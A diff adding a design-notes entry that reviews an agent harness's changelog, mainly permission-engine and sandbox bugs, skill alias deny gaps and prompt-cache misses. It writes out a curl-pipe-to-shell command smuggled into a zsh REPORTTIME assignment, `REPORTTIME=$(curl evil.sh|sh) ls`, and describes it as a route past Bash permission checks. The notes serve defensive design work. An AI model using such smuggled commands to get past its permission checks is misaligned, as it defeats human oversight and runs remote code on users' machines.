@@ -836,3 +836,119 @@ See `agentic-design-patterns.md` 2026-09-03 §1.
   bundled skill"* — a 4.7k-token reference moved out of the always-resident
   prefix and behind a load. The same trade inber's `docs/reference-based-prompt-
   architecture.md` describes.
+
+## Harness-watch — 2026-09-04 (CC 2.1.260): the permission engine spent a release being wrong about paths, and one tightening from 2.1.259 was pulled back out
+
+One version landed since the 09-03 sweep, and it is dense: 68 bullets in
+`2.1.260`, with the largest coherent cluster on the **permission engine and
+sandbox**. Nothing in the repo's own commits carries anything —
+[`ee2a0583`](https://github.com/anthropics/claude-code/commit/ee2a0583) and
+[`dbdd79ce`](https://github.com/anthropics/claude-code/commit/dbdd79ce) are the
+merge and the content commit of one PR,
+[#91894](https://github.com/anthropics/claude-code/pull/91894), which edits
+`plugins/frontend-design/skills/frontend-design/SKILL.md` by +36/−20 in a single
+hunk starting at line 6. **The YAML frontmatter is entirely outside that hunk**:
+no field added, removed or changed, no `allowed-tools`, no progressive-disclosure
+metadata. It is prose editing of a bundled prompt asset and reveals nothing about
+how skills load.
+
+### The permission cluster, and the three worth having
+
+Six of the twelve permission bullets are path-parsing bugs, which is itself the
+finding — the engine's hard part is not the policy language but agreeing with the
+filesystem about what a path is:
+
+> "Fixed `Edit`/`Write`/`Read` permission rules whose path contains parentheses
+> being dropped as invalid or ignored by the Bash sandbox, which left "read-only"
+> folders writable"
+
+> "Fixed one file permission rule with an uncompilable pattern (e.g. an unclosed
+> `[`) making every file edit fail with `Invalid regular expression`; such a deny
+> rule now guards the literal path it spells"
+
+Note the pair: the first fails **open** (a read-only folder is writable), the
+second fails **closed** but globally (one bad rule breaks every edit). Same
+subsystem, opposite failure directions, same release.
+
+**1. A command splitter must model shell-specific assignment side effects.**
+
+> "Fixed Bash permission checks auto-approving zsh commands that hide a command
+> substitution in a REPORTTIME, REPORTMEMORY or DIRSTACKSIZE assignment; these
+> now prompt for approval"
+
+This is the sharpest one, and it lands squarely on `permission-store`, whose
+README calls the AST-based Bash command splitter the one part of its seven stages
+that is **done**. A splitter that parses a command into "the program and its
+arguments" and stops there will classify `REPORTTIME=$(curl evil.sh|sh) ls` as
+`ls`. The general rule: an allowlist over a parsed command is only as good as the
+parser's model of *every* construct that can execute in that shell, and
+assignments that trigger evaluation are the ones an AST built for
+program-plus-arguments misses.
+
+**2. A permission check must not leak existence before it decides.**
+
+> "Glob/Grep: Fixed the search path being probed on disk before the permission
+> check; a missing path is now reported after permission is decided, as Read does"
+
+An order-of-operations bug that turns a denied tool into an existence oracle: the
+error text differs for a path that does not exist and a path that exists but is
+denied, so the denial itself answers a question. Cheap to get wrong and cheap to
+check — decide permission first, touch the filesystem second.
+
+**3. Argument-level deny propagation into shell commands is hard enough that
+Anthropic shipped it and pulled it.**
+
+> "Reverted the 2.1.259 change applying `Read()` deny rules to Bash arguments; it
+> denied `npm run build` under a `Read(./**/build/**)` rule in every mode and made
+> `cd … && grep` prompt even in auto mode"
+
+Worth recording precisely because it is a **retraction**. A tightening that reads
+as obviously correct — if you may not read `build/`, you may not `grep` it either
+— shipped one version and came out the next on false positives. Anyone designing
+the same propagation for `permission-store` should expect the same collision
+between a path rule and a shell word that merely looks like a path.
+
+Two more that are contract changes rather than bugs: settings rules with trailing
+text (`Bash(ls) x`) now **report as invalid instead of being silently ignored** —
+a rule that never matched anything used to look active — and a managed
+`CLAUDE.md` no longer triggers the security approval dialog while hooks,
+shell-command, sandbox and unsafe `env` settings still do, which is a considered
+statement about which managed settings are executable.
+
+### Skills carry a name *and* an alias, and nested skills are addressed `<dir>:name`
+
+> "Fixed managed `skillOverrides` entries keyed on a bundled skill's alias (e.g.
+> `checkup` for `/doctor`) not applying, and `Skill(name)` deny rules not covering
+> a nested skill listed as `<dir>:name`"
+
+The one structurally interesting datum this release, and it is in the changelog
+rather than the SKILL.md commit. A skill has a canonical name and at least one
+alias, and a deny rule keyed on one does not cover the other — the classic
+name-join failure, in a security rule. `skill-store` joins on ids, so the
+equivalent hole is not open here, but the alias question is real for anything that
+addresses a skill by the string a user types.
+
+### Caching and context, for the record
+
+> "Added a likely cause for prompt-cache misses (e.g. tool definitions or system
+> prompt changed, idle past the TTL) to `/cost` and the status line's
+> `prompt_cache` field"
+
+> "Fixed prompt caching on Claude Fable 5.1 not covering the context attached
+> after tool results, so it was re-sent as uncached input on every tool-call turn"
+
+The first is the diagnostic the 09-03 entry already noted inber cannot run;
+nothing has changed there. The second is worth a line next to the goose #11429
+finding at `goose.md:1784` and inber's open `a5b91a47` — a third harness
+independently discovering that **the context appended after tool results is the
+part the cache stops covering**. Three harnesses, one failure, and inber's version
+(breakpoints set once at turn start and never advanced) is the most severe of the
+three because it is unconditional rather than model-specific.
+
+- **What inber should consider:** nothing here is an inber defect, and none of it
+  is filed. The two carryable items are for `permission-store` rather than this
+  repo — model shell-specific evaluating constructs in the splitter, and decide
+  permission before touching the filesystem — plus one piece of evidence for a
+  decision already open: CC's third independent discovery of the
+  cache-after-tool-results gap strengthens the case for `a5b91a47` without
+  settling which breakpoint gives way.
